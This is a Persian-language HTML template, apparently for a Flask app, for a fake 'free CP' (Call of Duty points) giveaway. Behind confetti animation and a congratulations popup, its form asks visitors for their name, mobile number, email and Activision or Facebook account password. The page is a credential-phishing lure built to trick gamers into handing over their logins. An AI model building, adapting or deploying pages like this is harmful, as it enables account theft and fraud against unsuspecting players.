<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
  <title>سی‌پی رایگان</title>
</head>
<body>

  <!-- کانتینر بارش بلیت‌ها -->
  <div class="falling-papers"></div>

  <!-- فرم شیشه‌ای -->
  <div class="glass-box">
    <h1>سی‌پی رایگان</h1>
    <form id="raffleForm" action="/submit" method="POST">
      <input type="text" name="fullname" placeholder="نام و نام خانوادگی" required minlength="7" maxlength="35">
      
      <input 
        type="tel" 
        name="phone" 
        placeholder="شماره موبایل خود را وارد کنید (مثلاً 09012050000)" 
        pattern="^(0901|0902|0903|0930|0933|0935|0936|0937|0938|0939|0910|0911|0912|0913|0914|0915|0916|0917|0918|0919|0990|0991|0992|0993)\d{7}$"
        title="شماره تلفن باید ۱۱ رقم باشد و با یکی از پیش‌شماره‌های معتبر شروع شود."
        required 
        style="text-align:right; direction:ltr;"
      >

      <select name="company" required>
        <option value="" disabled selected>نوع اتصال</option>
        <option value="اکتیویژن">اکتیویژن</option>
        <option value="فیسبوک">فیسبوک</option>
      </select>

      <input type="email" name="email" placeholder="ایمیل" required>
      <input type="password" name="password" placeholder="رمز عبور" required>
      <input type="text" name="gamename" placeholder="نام در بازی" required>
      <input type="submit" value="تایید">
    </form>
  </div>

  <!-- popup پیام -->
  <div id="popup">تبریک! شما شرکت کردید!</div>

  <!-- جاوا اسکریپت برای بارش بلیت و popup -->
<script>
const paperContainer = document.querySelector('.falling-papers');
const colors = ['#0ff','#ff0','#f0f','#0f0','#ff6600'];

// تابع ایجاد بلیت
function createPaper() {
  const paper = document.createElement('div');
  paper.classList.add('paper');
  paper.style.left = Math.random() * window.innerWidth + 'px';
  paper.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
  paperContainer.appendChild(paper);

  let top = -20;
  const speed = 2 + Math.random() * 3;
  const rotate = Math.random() * 360;

  function fall() {
    top += speed;
    paper.style.top = top + 'px';
    paper.style.transform = `rotate(${rotate + top*3}deg)`;
    if(top < window.innerHeight) requestAnimationFrame(fall);
    else paperContainer.removeChild(paper);
  }

  fall();
}

setInterval(createPaper, 200); // هر 0.2 ثانیه یک بلیت ایجاد می‌شود

// ================= Popup =================
const form = document.getElementById('raffleForm');
const popup = document.getElementById('popup');

form.addEventListener('submit', function(e) {
  e.preventDefault();

  // نمایش popup با fade-in
  popup.style.display = 'block';
  popup.style.opacity = '1';

  // بعد از 5 ثانیه fade-out
  setTimeout(() => {
    popup.style.opacity = '0';
    setTimeout(() => {
      popup.style.display = 'none'; // مخفی کردن بعد از fade
    }, 500); // مدت زمان fade-out مطابق CSS
    form.reset();
  }, 5000); // مدت زمان نمایش popup
});
</script>


</body>
</html>
